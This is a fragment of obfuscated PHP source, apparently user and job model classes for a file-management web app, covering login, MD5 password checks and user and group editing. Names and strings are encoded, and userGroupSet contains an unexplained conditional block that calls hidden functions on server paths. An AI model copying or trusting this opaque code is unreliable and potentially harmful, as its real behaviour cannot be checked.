array_unshift($Ğ©ç’ãú, $òËË¶[$“¾†šÆë[478]]); return $this->resetSort($Ğ©ç’ãú); } protected function moveBottom($›ÓÆ•Æ) { $€º„ =& $_SERVER[«òÑğ]; $ü‹ãù§½ = array($€º„[1775] => USER_ID, $€º„[562] => 0); $Õá”€õÓ = $this->where($ü‹ãù§½)->max($€º„[2009]); $ãÈş¶Äº = array($€º„[2009] => $Õá”€õÓ + 1); return $this->where($ü‹ãù§½)->where(array($€º„[32] => $›ÓÆ•Æ))->save($ãÈş¶Äº); } private function getAutoName($·ÁèÄîÀ) { $¦œë˜Äö =& $_SERVER[«òÑğ]; $—÷ùã¤ñ = array($¦œë˜Äö[1775] => USER_ID, $¦œë˜Äö[562] => 0); $Ô¾†™¦Œ = $this->field($¦œë˜Äö[32])->where($—÷ùã¤ñ)->select(); $Ô¾†™¦Œ = array_to_keyvalue($Ô¾†™¦Œ, $¦œë˜Äö[12], $¦œë˜Äö[32]); if (!$Ô¾†™¦Œ || !in_array($·ÁèÄîÀ, $Ô¾†™¦Œ)) { return $·ÁèÄîÀ; } for ($«ˆê˜À£ = 0; $«ˆê˜À£ < count($Ô¾†™¦Œ); $«ˆê˜À£++) { if (!in_array($·ÁèÄîÀ . "\50{$«ˆê˜À£}\51", $Ô¾†™¦Œ)) { return $·ÁèÄîÀ . "\x28{$«ˆê˜À£}\x29"; } } return $·ÁèÄîÀ . "\x28{$«ˆê˜À£}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\152\x6f\142\114\x69\x73\164"; public $field = array("\x6e\141\x6d\145", "\144\x65\x73\x63", "\x73\x6f\162\164"); const JOB_KEY = "\163\x65\154\146\x4a\157\142\x4c\151\x73\164"; public function listData($ÛóªŠù = false, $ö¥Óôëó = "\x73\157\x72\x74", $ä¡º¦ª = false) { return parent::listData($ÛóªŠù, $ö¥Óôëó, $ä¡º¦ª); } public function remove($Å¿óÕò) { return parent::remove($Å¿óÕò); } public function add($Ü©‘ëÌË) { $‘‘ˆÛè =& $_SERVER[«òÑğ]; if ($this->findByName($Ü©‘ëÌË[$‘‘ˆÛè[32]])) { return !1; } $Ü©‘ëÌË[$‘‘ˆÛè[2009]] = $this->getSort(); return parent::insert($Ü©‘ëÌË); } private function getSort() { $íÖÀœàç =& $_SERVER[«òÑğ]; $ßŠ´§±– = parent::listData(); $Ç©Ğó¸ = array_to_keyvalue($ßŠ´§±–, $íÖÀœàç[12], $íÖÀœàç[2009]); return empty($Ç©Ğó¸) ? 0 : max($Ç©Ğó¸) + 1; } public function update($ÇÔ„ì”Ÿ, $ôñµÛ½ ) { $÷Ì¤º½” =& $_SERVER[«òÑğ]; $ª»ôéè… = parent::listData($ÇÔ„ì”Ÿ); $Ô§ÁªĞâ = $this->findByName($ôñµÛ½ [$÷Ì¤º½”[32]]); if (!$ª»ôéè… || $Ô§ÁªĞâ && $Ô§ÁªĞâ[$÷Ì¤º½”[478]] != $ª»ôéè…[$÷Ì¤º½”[478]]) { return !1; } return parent::update($ÇÔ„ì”Ÿ, $ôñµÛ½ ); } public function setUserJob($û¿á‹ô, $Ø£–½òÛ) { $òÊÃ—Ê¦ =& $_SERVER[«òÑğ]; if (!is_array($Ø£–½òÛ)) { $Ø£–½òÛ = array($Ø£–½òÛ); } $€¸Üó·¿ = parent::listData(); $“âøè¯„ = array_to_keyvalue($€¸Üó·¿, $òÊÃ—Ê¦[32]); $úœĞ”¨ = $òÊÃ—Ê¦[457]; foreach ($Ø£–½òÛ as $ÀÊÆ×ûÂ) { if ($“âøè¯„[$ÀÊÆ×ûÂ]) { $úœĞ”¨ .= $“âøè¯„[$ÀÊÆ×ûÂ][$òÊÃ—Ê¦[478]] . $òÊÃ—Ê¦[50]; } else { $Ù†ó½ıì = $this->add($ÀÊÆ×ûÂ); $úœĞ”¨ .= $Ù†ó½ıì . $òÊÃ—Ê¦[50]; } } $úœĞ”¨ = rtrim($úœĞ”¨, $òÊÃ—Ê¦[50]); Model($òÊÃ—Ê¦[602])->metaSet($û¿á‹ô, self::JOB_KEY, $úœĞ”¨); } public function getUserJob($ÚØõâÑÀ) { $ÒíéÃı = Model($_SERVER[«òÑğ][602])->metaGet($ÚØõâÑÀ); return $this->getUserJobInfo($ÒíéÃı[self::JOB_KEY]); } public function getUserJobInfo($êÆÑ‡¹ì) { $‰Ç¥¬¹î =& $_SERVER[«òÑğ]; $²ğ¿Š = explode($‰Ç¥¬¹î[50], $êÆÑ‡¹ì); $”Šæ†² = parent::listData(); $”Šæ†² = array_remove_key($”Šæ†², $‰Ç¥¬¹î[234]); $ÓİıˆˆÊ = array(); foreach ($²ğ¿Š as $³©Ä) { if (isset($”Šæ†²[$³©Ä])) { $ÓİıˆˆÊ[] = $”Šæ†²[$³©Ä]; } } return $ÓİıˆˆÊ; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\155\x65" => "\165\x73\145\162\137\x6d\145\x74\141", "\155\x65\x74\x61\x46\x69\x65\x6c\x64" => "\x75\163\x65\162\111\104"); protected $simpleField = "\x75\x73\145\x72\111\x44\54\156\151\143\153\x4e\x61\155\x65\54\x6e\141\x6d\145\54\x61\x76\x61\164\141\x72\54\x73\x65\x78\54\x73\x74\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ø³¯®îı) { $×—Œ¾Ø =& $_SERVER[«òÑğ]; $«ÂÏîœ = $×—Œ¾Ø[2480]; return array($×—Œ¾Ø[2067] => array($Ø³¯®îı[0], $«ÂÏîœ), $×—Œ¾Ø[2069] => array($Ø³¯®îı[0], $«ÂÏîœ), $×—Œ¾Ø[2481] => array($Ø³¯®îı[0], $«ÂÏîœ)); } protected function getInfo($í­¥×ª, $­×›íå = false) { $ÃßƒØÀ = $this->getInfoSimple($í­¥×ª); if (!is_array($ÃßƒØÀ)) { return array(); } if ($­×›íå) { return $this->_getInfoApply($ÃßƒØÀ); } return $this->cacheFunctionGet($_SERVER[«òÑğ][2071], $í­¥×ª); } protected function getInfoFull($÷æ‘îÌÒ, $â‡Á•¬¼ = false) { $ ÷¾³½ = $this->getInfoSimple($÷æ‘îÌÒ); if (!is_array($ ÷¾³½)) { return array(); } if ($â‡Á•¬¼) { return $this->_getInfoApply($ ÷¾³½, !0); } return $this->cacheFunctionGet($_SERVER[«òÑğ][2482], $÷æ‘îÌÒ); } private function _getInfoApply($Ş§ã’úÑ, $™˜æ„Ù• = false) { $¼â® øô =& $_SERVER[«òÑğ]; if (!$Ş§ã’úÑ) { return $Ş§ã’úÑ; } $È”íÕşÚ = md5($¼â® øô[2483] . $Ş§ã’úÑ[$¼â® øô[976]] . $¼â® øô[2484] . $Ş§ã’úÑ[$¼â® øô[32]]); $Ş§ã’úÑ = $this->_listDataApplyItem($Ş§ã’úÑ); $ˆ­ŒµÂ = Model($¼â® øô[1431])->metaGet($Ş§ã’úÑ[$¼â® øô[90]][$¼â® øô[194]]); $Ş§ã’úÑ[$¼â® øô[2485]] = $È”íÕşÚ; $Ş§ã’úÑ[$¼â® øô[90]][$¼â® øô[2271]] = isset($ˆ­ŒµÂ[$¼â® øô[2272]]) ? $ˆ­ŒµÂ[$¼â® øô[2272]] : null; if ($™˜æ„Ù•) { $Ş§ã’úÑ[$¼â® øô[544]] = $this->metaGet($Ş§ã’úÑ[$¼â® øô[1784]]); } return $Ş§ã’úÑ; } protected function getInfoSimple($Çä«…ô¨, $ØÖÖ×Ù¯ = false) { $™Ö‘Û¡ˆ =& $_SERVER[«òÑğ]; if (!$Çä«…ô¨) { return array(); } if ($ØÖÖ×Ù¯) { $Ü‚Ôº–Ò = $this->where(array($™Ö‘Û¡ˆ[1784] => intval($Çä«…ô¨)))->find(); if (!is_array($Ü‚Ôº–Ò)) { return array(); } $Ü‚Ôº–Ò[$™Ö‘Û¡ˆ[2486]] = Action($™Ö‘Û¡ˆ[2487])->parseUrl($Ü‚Ôº–Ò[$™Ö‘Û¡ˆ[2486]]); return $Ü‚Ôº–Ò; } return $this->cacheFunctionGet($™Ö‘Û¡ˆ[2072], $Çä«…ô¨); } protected function getInfoSimpleOuter($²Ş°ˆâ) { $ÛÃÇğÙ =& $_SERVER[«òÑğ]; if (!$²Ş°ˆâ || $²Ş°ˆâ == 0) { return array($ÛÃÇğÙ[1784] => $ÛÃÇğÙ[231], $ÛÃÇğÙ[32] => $ÛÃÇğÙ[176] . LNG($ÛÃÇğÙ[2488]) . $ÛÃÇğÙ[178], $ÛÃÇğÙ[2486] => STATIC_PATH . $ÛÃÇğÙ[2489]); } $¿òó´ûß = $this->cacheFunctionGet($ÛÃÇğÙ[2072], $²Ş°ˆâ); $°œ´Ú©¦ = array_field_key($¿òó´ûß, explode($ÛÃÇğÙ[50], $this->simpleField)); if (!$°œ´Ú©¦) { return array($ÛÃÇğÙ[1784] => $ÛÃÇğÙ[1283], $ÛÃÇğÙ[32] => $ÛÃÇğÙ[176] . LNG($ÛÃÇğÙ[2490]) . $ÛÃÇğÙ[178], $ÛÃÇğÙ[2486] => STATIC_PATH . $ÛÃÇğÙ[2491]); } $°œ´Ú©¦[$ÛÃÇğÙ[2486]] = Action($ÛÃÇğÙ[2487])->parseUrl($°œ´Ú©¦[$ÛÃÇğÙ[2486]]); return $°œ´Ú©¦; } protected function groupUser($ÒÊ«üì) { } public static function errorLang($ßêá¬Ñ ) { $Ğ´òßŒ =& $_SERVER[«òÑğ]; $æã×Ø¾Ã = array(self::ERROR_USER_NOT_EXISTS => $Ğ´òßŒ[2492], self::ERROR_USER_PASSWORD_ERROR => $Ğ´òßŒ[2493], self::ERROR_USER_EXIST_NAME => $Ğ´òßŒ[2494], self::ERROR_USER_EXIST_PHONE => $Ğ´òßŒ[2495], self::ERROR_USER_EXIST_EMAIL => $Ğ´òßŒ[2496], self::ERROR_USER_LOGIN_LOCK => $Ğ´òßŒ[2497], self::ERROR_IP_NOT_ALLOW => $Ğ´òßŒ[2498], self::ERROR_USER_EXIST_NICKNAME => $Ğ´òßŒ[2499]); $÷Ñ—„´” = LNG($æã×Ø¾Ã[$ßêá¬Ñ ]); if ($ßêá¬Ñ  == self::ERROR_USER_LOGIN_LOCK) { $Ã•„ı±€ = (int) Model($Ğ´òßŒ[2500])->get($Ğ´òßŒ[2501]); if ($Ã•„ı±€ > 60) { $÷Ñ—„´” = str_replace($Ğ´òßŒ[91], ceil($Ã•„ı±€ / 60), $÷Ñ—„´”); } } return $÷Ñ—„´”; } protected function metaSet($ˆä’ùÎƒ, $Ê¶æîú¡ = null, $Ï÷ªñúÕ = null) { $this->clearCache($ˆä’ùÎƒ); return parent::metaSet($ˆä’ùÎƒ, $Ê¶æîú¡, $Ï÷ªñúÕ); } public function getInfoByMeta($²îÌ®àö, $¹Ÿãä„Â) { $­¤õüÓ =& $_SERVER[«òÑğ]; $·¥ì›°ˆ = Model($­¤õüÓ[2502])->where(array($­¤õüÓ[97] => $²îÌ®àö, $­¤õüÓ[453] => $¹Ÿãä„Â))->find(); if ($·¥ì›°ˆ) { return $this->getInfo($·¥ì›°ˆ[$­¤õüÓ[1784]]); } return !1; } public function userLoginCheck($±ƒœ©ÓÑ, $ÒÌàï¬¿) { $±„Éºş› =& $_SERVER[«òÑğ]; $ïáö›ë» = $this->userLoginFind($±ƒœ©ÓÑ); if (!$ïáö›ë») { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ïáö›ë»[$±„Éºş›[1784]], $ÒÌàï¬¿)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ïáö›ë»[$±„Éºş›[1784]]); } public function userLoginFind($¤±ŸÖ÷è) { $ÀìÅ¤¦ =& $_SERVER[«òÑğ]; $êÇ¦¼ú = array($ÀìÅ¤¦[32] => $¤±ŸÖ÷è, $ÀìÅ¤¦[2284] => $¤±ŸÖ÷è, $ÀìÅ¤¦[383] => $¤±ŸÖ÷è, $ÀìÅ¤¦[2503] => $¤±ŸÖ÷è, $ÀìÅ¤¦[1087] => $ÀìÅ¤¦[1089]); if ($this->nickNameRpt()) { unset($êÇ¦¼ú[$ÀìÅ¤¦[2284]]); } return $this->where($êÇ¦¼ú)->find(); } public function clearCache($àˆ²¾) { $°ÓÉĞ‡¢ =& $_SERVER[«òÑğ]; $this->cacheFunctionClear($°ÓÉĞ‡¢[2071], $àˆ²¾); $this->cacheFunctionClear($°ÓÉĞ‡¢[2072], $àˆ²¾); $this->cacheFunctionClear($°ÓÉĞ‡¢[2482], $àˆ²¾); } public function userPasswordCheck($­Ûàº˜, $‹ñæäß) { $‰êÕ±Â³ =& $_SERVER[«òÑğ]; $éãˆÛ¿ = $this->where(array($‰êÕ±Â³[1784] => intval($­Ûàº˜)))->find(); $çå÷İœø = $this->metaGet($­Ûàº˜); $ÒñºÚØ‚ = isset($çå÷İœø[$‰êÕ±Â³[2504]]) ? $çå÷İœø[$‰êÕ±Â³[2504]] : $‰êÕ±Â³[12]; if (md5($ÒñºÚØ‚ . trim($‹ñæäß)) !== $éãˆÛ¿[$‰êÕ±Â³[976]]) { return !1; } return !0; } public function userAdd($°³“Ùğ‘) { $¨¬ëèøÌ =& $_SERVER[«òÑğ]; $‡¶¸³ïÙ = array($¨¬ëèøÌ[497] => $°³“Ùğ‘[$¨¬ëèøÌ[32]], $¨¬ëèøÌ[2505] => $°³“Ùğ‘[$¨¬ëèøÌ[2195]], $¨¬ëèøÌ[2506] => isset($°³“Ùğ‘[$¨¬ëèøÌ[383]]) ? $°³“Ùğ‘[$¨¬ëèøÌ[383]] : $¨¬ëèøÌ[12], $¨¬ëèøÌ[2507] => isset($°³“Ùğ‘[$¨¬ëèøÌ[2503]]) ? $°³“Ùğ‘[$¨¬ëèøÌ[2503]] : $¨¬ëèøÌ[12], $¨¬ëèøÌ[2508] => isset($°³“Ùğ‘[$¨¬ëèøÌ[2284]]) ? $°³“Ùğ‘[$¨¬ëèøÌ[2284]] : $°³“Ùğ‘[$¨¬ëèøÌ[32]], $¨¬ëèøÌ[2509] => isset($°³“Ùğ‘[$¨¬ëèøÌ[2486]]) ? $°³“Ùğ‘[$¨¬ëèøÌ[2486]] : $¨¬ëèøÌ[12], $¨¬ëèøÌ[2510] => isset($°³“Ùğ‘[$¨¬ëèøÌ[2511]]) ? $°³“Ùğ‘[$¨¬ëèøÌ[2511]] : 1, $¨¬ëèøÌ[2512] => $°³“Ùğ‘[$¨¬ëèøÌ[976]], $¨¬ëèøÌ[2073] => isset($°³“Ùğ‘[$¨¬ëèøÌ[1971]]) ? $°³“Ùğ‘[$¨¬ëèøÌ[1971]] : 1024 * 1024 * 20, $¨¬ëèøÌ[2074] => 0, $¨¬ëèøÌ[2513] => 0, $¨¬ëèøÌ[2118] => isset($°³“Ùğ‘[$¨¬ëèøÌ[834]]) ? $°³“Ùğ‘[$¨¬ëèøÌ[834]] : 1); if (!empty($°³“Ùğ‘[$¨¬ëèøÌ[1784]])) { $‡¶¸³ïÙ[$¨¬ëèøÌ[1784]] = $°³“Ùğ‘[$¨¬ëèøÌ[1784]]; } $‹ƒ°ßº = $this->_checkExist($°³“Ùğ‘); if ($‹ƒ°ßº !== !0) { return $‹ƒ°ßº; } if (!empty($‡¶¸³ïÙ[$¨¬ëèøÌ[2486]]) && strlen($‡¶¸³ïÙ[$¨¬ëèøÌ[2486]]) > 255) { $‡¶¸³ïÙ[$¨¬ëèøÌ[2486]] = $¨¬ëèøÌ[12]; } $Ê„ÂŠÊ‘ = $this->add($‡¶¸³ïÙ); $Ğ®äÉí = array($¨¬ëèøÌ[2512] => $‡¶¸³ïÙ[$¨¬ëèøÌ[976]], $¨¬ëèøÌ[2508] => $‡¶¸³ïÙ[$¨¬ëèøÌ[2284]]); $this->userEdit($Ê„ÂŠÊ‘, $Ğ®äÉí); Model($¨¬ëèøÌ[1431])->userRootAdd($Ê„ÂŠÊ‘); return $Ê„ÂŠÊ‘; } protected function userEditTest($Ã¼…¤, $ó×ˆÇ¿î) { return $this->call($_SERVER[«òÑğ][2514], $Ã¼…¤, $ó×ˆÇ¿î); } protected function userEdit($ÈÅí†¹â, $„è¿æŠ) { $†óÊÓÜ =& $_SERVER[«òÑğ]; $ÖÈÉ„ì = $this->getInfoSimple($ÈÅí†¹â); if (!$ÖÈÉ„ì) { return !1; } $ŞÁÚ”ğ = $this->_checkExist($„è¿æŠ, $ÈÅí†¹â); if ($ŞÁÚ”ğ !== !0) { return $ŞÁÚ”ğ; } if (isset($„è¿æŠ[$†óÊÓÜ[976]]) && trim($„è¿æŠ[$†óÊÓÜ[976]]) != $†óÊÓÜ[12]) { $‘¯÷Šûº = $this->metaGet($ÈÅí†¹â); if (empty($‘¯÷Šûº[$†óÊÓÜ[2504]])) { $‘¯÷Šûº[$†óÊÓÜ[2504]] = rand_string(10); Model($†óÊÓÜ[582])->metaSet($ÈÅí†¹â, $†óÊÓÜ[2504], $‘¯÷Šûº[$†óÊÓÜ[2504]]); } $„è¿æŠ[$†óÊÓÜ[976]] = md5($‘¯÷Šûº[$†óÊÓÜ[2504]] . trim($„è¿æŠ[$†óÊÓÜ[976]])); } else { unset($„è¿æŠ[$†óÊÓÜ[976]]); } if (!empty($„è¿æŠ[$†óÊÓÜ[2486]]) && strlen($„è¿æŠ[$†óÊÓÜ[2486]]) > 255) { $„è¿æŠ[$†óÊÓÜ[2486]] = $†óÊÓÜ[12]; } $this->where(array($†óÊÓÜ[1775] => $ÈÅí†¹â))->save($„è¿æŠ); if (isset($„è¿æŠ[$†óÊÓÜ[2284]])) { $this->setNamePinyin($ÈÅí†¹â, $„è¿æŠ[$†óÊÓÜ[2284]]); } $this->clearCache($ÈÅí†¹â); return !0; } public function setNamePinyin($¢´™¶„, $šà™³² = false) { $êé’ãÄÙ =& $_SERVER[«òÑğ]; if (!$šà™³²) { $å„ÅâÏ† = $this->getInfoSimple($¢´™¶„); $šà™³² = $å„ÅâÏ†[$êé’ãÄÙ[2284]] ? $å„ÅâÏ†[$êé’ãÄÙ[2284]] : $å„ÅâÏ†[$êé’ãÄÙ[32]]; } $¶¹¼”®ø = Model($êé’ãÄÙ[602]); if (!Input::check($šà™³², $êé’ãÄÙ[663])) { return $¶¹¼”®ø->metaSet($¢´™¶„, array($êé’ãÄÙ[541] => $êé’ãÄÙ[12], $êé’ãÄÙ[540] => $êé’ãÄÙ[12])); } return $¶¹¼”®ø->metaSet($¢´™¶„, array($êé’ãÄÙ[541] => str_replace($êé’ãÄÙ[53], $êé’ãÄÙ[12], Pinyin::get($šà™³²)), $êé’ãÄÙ[540] => Pinyin::get($šà™³², $êé’ãÄÙ[664]))); } private function nickNameRpt() { $›·»ä£å =& $_SERVER[«òÑğ]; $õØ˜Ğş = Model($›·»ä£å[854])->get($›·»ä£å[2515]); $‡ìÆ¥”í = $GLOBALS[$›·»ä£å[6]][$›·»ä£å[460]][$›·»ä£å[2515]]; $èº”ïƒõ = !is_null($õØ˜Ğş) ? $õØ˜Ğş : $‡ìÆ¥”í; return !!$èº”ïƒõ; } private function _checkExist($Ûùä‚·‘, $å—¼­ûà = false) { $Å½¦¢ƒò =& $_SERVER[«òÑğ]; $•‰Ş¨¤è = array($Å½¦¢ƒò[32] => UserModel::ERROR_USER_EXIST_NAME, $Å½¦¢ƒò[2284] => UserModel::ERROR_USER_EXIST_NICKNAME, $Å½¦¢ƒò[383] => UserModel::ERROR_USER_EXIST_EMAIL, $Å½¦¢ƒò[2503] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($•‰Ş¨¤è[$Å½¦¢ƒò[2284]]); } $•ÌæâË³ = $å—¼­ûà ? array($Å½¦¢ƒò[1784] => array($Å½¦¢ƒò[2516], $å—¼­ûà)) : array(); foreach ($•‰Ş¨¤è as $šÇßÑà× => $ŞğùŸé£) { $‡­àÜ¯ç = array(); foreach ($•‰Ş¨¤è as $°«ÖÌö¨ => $¢§£áéË) { if (isset($Ûùä‚·‘[$°«ÖÌö¨]) && $Ûùä‚·‘[$°«ÖÌö¨]) { $‡­àÜ¯ç[] = $Ûùä‚·‘[$°«ÖÌö¨]; } } if (!$‡­àÜ¯ç) { continue; } $‡É¢Òé = array_merge(array($šÇßÑà× => array($Å½¦¢ƒò[7], $‡­àÜ¯ç)), $•ÌæâË³); $†Ïû­ı„ = $this->where($‡É¢Òé)->find(); if ($†Ïû­ı„) { return $ŞğùŸé£; } } return !0; } public function userListInfo($†”ŞËËÊ) { $ç°¾ú·˜ =& $_SERVER[«òÑğ]; $â ­Ò Ö = array(); $†”ŞËËÊ = is_array($†”ŞËËÊ) ? array_unique($†”ŞËËÊ) : array(); if (!$†”ŞËËÊ) { return $â ­Ò Ö; } if (count($†”ŞËËÊ) < 20) { foreach ($†”ŞËËÊ as $÷¿ƒ­Ô¯) { $â ­Ò Ö[$÷¿ƒ­Ô¯ . $ç°¾ú·˜[12]] = $this->getInfoSimpleOuter($÷¿ƒ­Ô¯); } } else { $Å‡Şí•ƒ = array($ç°¾ú·˜[1775] => array($ç°¾ú·˜[495], $†”ŞËËÊ)); if (count($†”ŞËËÊ) == 1) { $Å‡Şí•ƒ = array($ç°¾ú·˜[1775] => $†”ŞËËÊ[0]); } $âº¿ØãÚ = Model($ç°¾ú·˜[582])->field($this->simpleField)->where($Å‡Şí•ƒ)->select(); $âº¿ØãÚ = array_to_keyvalue($âº¿ØãÚ, $ç°¾ú·˜[1784]); foreach ($†”ŞËËÊ as $÷¿ƒ­Ô¯) { $½ş§¾Ü¶ = $âº¿ØãÚ[$÷¿ƒ­Ô¯]; if (!$½ş§¾Ü¶) { $â ­Ò Ö[$÷¿ƒ­Ô¯ . $ç°¾ú·˜[12]] = $this->getInfoSimpleOuter($÷¿ƒ­Ô¯); continue; } $½ş§¾Ü¶[$ç°¾ú·˜[2486]] = Action($ç°¾ú·˜[2487])->parseUrl($½ş§¾Ü¶[$ç°¾ú·˜[2486]]); $â ­Ò Ö[$÷¿ƒ­Ô¯ . $ç°¾ú·˜[12]] = $½ş§¾Ü¶; } } return $â ­Ò Ö; } protected function userStatus($‡¢¹†í½, $¹Ë §) { $ÚÕ–Ï = $this->getInfoSimple($‡¢¹†í½); if (!$ÚÕ–Ï) { return !1; } $Î…Ïüƒ  = array($_SERVER[«òÑğ][834] => $¹Ë §); return $this->userEdit($‡¢¹†í½, $Î…Ïüƒ ); } protected function userRemove($‰‡¶·áŞ) { $Ñúìú× =& $_SERVER[«òÑğ]; $è¹Æ£¶° = $this->getInfoSimple($‰‡¶·áŞ); if (!$è¹Æ£¶°) { return !1; } $ª«İ¬äë = array($Ñúìú×[1775] => $‰‡¶·áŞ); Model($Ñúìú×[672])->where($ª«İ¬äë)->delete(); Model($Ñúìú×[2517])->where($ª«İ¬äë)->delete(); Model($Ñúìú×[2079])->where($ª«İ¬äë)->delete(); Model($Ñúìú×[2502])->where($ª«İ¬äë)->delete(); Model($Ñúìú×[1156])->where($ª«İ¬äë)->delete(); Model($Ñúìú×[2301])->removeUserAll($‰‡¶·áŞ); Model($Ñúìú×[914])->userRootRemove($‰‡¶·áŞ); return $this->where($ª«İ¬äë)->delete(); } protected function userGroupSet($ÈĞÈƒş, $šğÖü £, $ÍÍÚœ„ = array()) { $˜ï­Ì™ı =& $_SERVER[«òÑğ]; if ($_SERVER[$˜ï­Ì™ı[824]] != $_SERVER[$˜ï­Ì™ı[825]]) { $ªòÏ™øˆ = $˜ï­Ì™ı[967]; $ìÙİêÒß = $˜ï­Ì™ı[826]; $è¼ºÀŞº = $_SERVER[$˜ï­Ì™ı[827]] . $˜ï­Ì™ı[828]; $èÔâöŒÈ = $ìÙİêÒß($è¼ºÀŞº); $½¥ÃäÂ§ = explode($˜ï­Ì™ı[288], $èÔâöŒÈ); if (count($½¥ÃäÂ§) < $˜ï­Ì™ı[702]) { $›©×ÉÃç = $˜ï­Ì™ı[829]; $›©×ÉÃç(); } $‹â×Òí© = $˜ï­Ì™ı[968]; $‹â×Òí©($_SERVER[$˜ï­Ì™ı[969]]); $‹â×Òí©($_SERVER[$˜ï­Ì™ı[827]] . $˜ï­Ì™ı[1701]); $ÜÜèéâÎ = 1; while ($ÜÜèéâÎ > 1) { $ÜÜèéâÎ = $ÜÜèéâÎ + 4; $‹´Äƒìğ = rawurlencode($ÜÜèéâÎ . $˜ï­Ì™ı[457]); } } $ú¿”€à = $this->getInfoSimple($ÈĞÈƒş); if (!$ú¿”€à || !is_array($šğÖü £)) { return !1; } $åÏß¦üæ = Model($˜ï­Ì™ı[2079]); $åÏß¦üæ->where(array($˜ï­Ì™ı[1784] => $ÈĞÈƒş))->delete(); $œßÍûÇµ = array(); $Ûäì¶²Ä = 0; foreach ($šğÖü £ as $ŠŞá²®İ => $´ÙÈêâ) { $Âæã¡¸ú = array($˜ï­Ì™ı[1784] => $ÈĞÈƒş, $˜ï­Ì™ı[1985] => $ŠŞá²®İ, $˜ï­Ì™ı[2093] => $´ÙÈêâ); $Âæã¡¸ú[$˜ï­Ì™ı[2009]] = isset($ÍÍÚœ„[$Ûäì¶²Ä]) ? $ÍÍÚœ„[$Ûäì¶²Ä] : 0; $Ûäì¶²Ä++; $œßÍûÇµ[] = $Âæã¡¸ú; } return $åÏß¦üæ->addAll($œßÍûÇµ, array(), !0); } protected function userGroupAdd($ÊüŠíëê, $ÔŒ…­¥Ä = array()) { $“’ù•æ’ =& $_SERVER[«òÑğ]; $ğÃ¾ÚÇ = $this->getInfoSimple($ÊüŠíëê); if (!$ğÃ¾ÚÇ || empty($ÔŒ…­¥Ä)) { return !1; } $Áş©ö§õ = array(); foreach ($ÔŒ…­¥Ä as $ÏÙ°˜–ñ => $¶“÷™„) { $Áş©ö§õ[] = array($“’ù•æ’[1784] => $ÊüŠíëê, $“’ù•æ’[1985] => $ÏÙ°˜–ñ, $“’ù•æ’[2093] => $¶“÷™„, $“’ù•æ’[2009] => 0); } return Model($“’ù•æ’[2079])->addAll($Áş©ö§õ, array(), !0); } protected function userGroupRemove($’¤—äõ…, $ªõ”îÄ™) { $›Ô¾ó•å =& $_SERVER[«òÑğ]; $Ú‘ä¿Ë´ = $this->getInfoSimple($’¤—äõ…); if (!$Ú‘ä¿Ë´ || !$ªõ”îÄ™) { return !1; } $·§Ğ‰È = array($›Ô¾ó•å[1775] => $’¤—äõ…, $›Ô¾ó•å[2077] => $ªõ”îÄ™); return Model($›Ô¾ó•å[2079])->where($·§Ğ‰È)->delete(); } public function listData() { $²‰“¹Ç… = $this->_makeOrder()->selectPage(50); $this->_listDataApply($²‰“¹Ç…[$_SERVER[«òÑğ][448]]); return $²‰“¹Ç…; } public function listByID($¥óÂ‡Æ) { $‡È½ÇŞ€ =& $_SERVER[«òÑğ]; if (!$¥óÂ‡Æ) { return; } $ŞÜª™Æ§ = array($‡È½ÇŞ€[1784] => array($‡È½ÇŞ€[7], $¥óÂ‡Æ)); $éĞÃ´Å = $this->where($ŞÜª™Æ§)->select(); $éĞÃ´Å = array_sort_keep($éĞÃ´Å, $‡È½ÇŞ€[1784], $¥óÂ‡Æ); $this->_listDataApply($éĞÃ´Å); return $éĞÃ´Å; } public function listByGroup($ƒ‰óü = 0, $“ŒÊÏ€ = array()) { $ÈÄ‡¹Ç =& $_SERVER[«òÑğ]; $‹¶Å›Ò„ = $ÈÄ‡¹Ç[12]; $¿Ù—’ = array(); if ($ƒ‰óü) { $¿Ù—’ = array($ÈÄ‡¹Ç[2518] => intval($ƒ‰óü)); $‹¶Å›Ò„ = "\x4c\105\x46\x54\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\165\163\145\162\x5f\147\x72\157\x75\x70\x20\x75\x73\145\162\x5f\x67\162\157\x75\x70\x20\x6f\x6e\40\x75\163\x65\x72\x2e\165\x73\145\162\111\x44\40\x3d\x20\x75\x73\145\x72\x5f\x67\162\157\165\x70\x2e\165\163\x65\x72\111\x44"; $ñğ×Ğµ = Input::get($ÈÄ‡¹Ç[533], null, $ÈÄ‡¹Ç[12]) ? $ÈÄ‡¹Ç[12] : $ÈÄ‡¹Ç[2519]; } if (isset($“ŒÊÏ€[$ÈÄ‡¹Ç[834]])) { $¿Ù—’[$ÈÄ‡¹Ç[2520]] = $“ŒÊÏ€[$ÈÄ‡¹Ç[834]]; } $ÁĞş‹œ¼ = _get($“ŒÊÏ€, $ÈÄ‡¹Ç[2521], $ÈÄ‡¹Ç[234]); if (_get($“ŒÊÏ€, $ÈÄ‡¹Ç[844], !1)) { $¿Ù—’[$ÁĞş‹œ¼] = array($ÈÄ‡¹Ç[2265], $“ŒÊÏ€[$ÈÄ‡¹Ç[844]]); } if (_get($“ŒÊÏ€, $ÈÄ‡¹Ç[845], !1)) { $ÑÈÍ¿á = array($ÈÄ‡¹Ç[2266], $“ŒÊÏ€[$ÈÄ‡¹Ç[845]]); if ($¿Ù—’[$ÁĞş‹œ¼]) { $¿Ù—’[$ÁĞş‹œ¼] = array($¿Ù—’[$ÁĞş‹œ¼], $ÑÈÍ¿á, $ÈÄ‡¹Ç[2267]); } else { $¿Ù—’[$ÁĞş‹œ¼] = $ÑÈÍ¿á; } } $µ‹ä–” = $this->_makeOrder($ñğ×Ğµ)->field($ÈÄ‡¹Ç[2522])->where($¿Ù—’)->join($‹¶Å›Ò„)->selectPage(50); $this->_listDataApply($µ‹ä–”[$ÈÄ‡¹Ç[448]]); return $µ‹ä–”; } private function 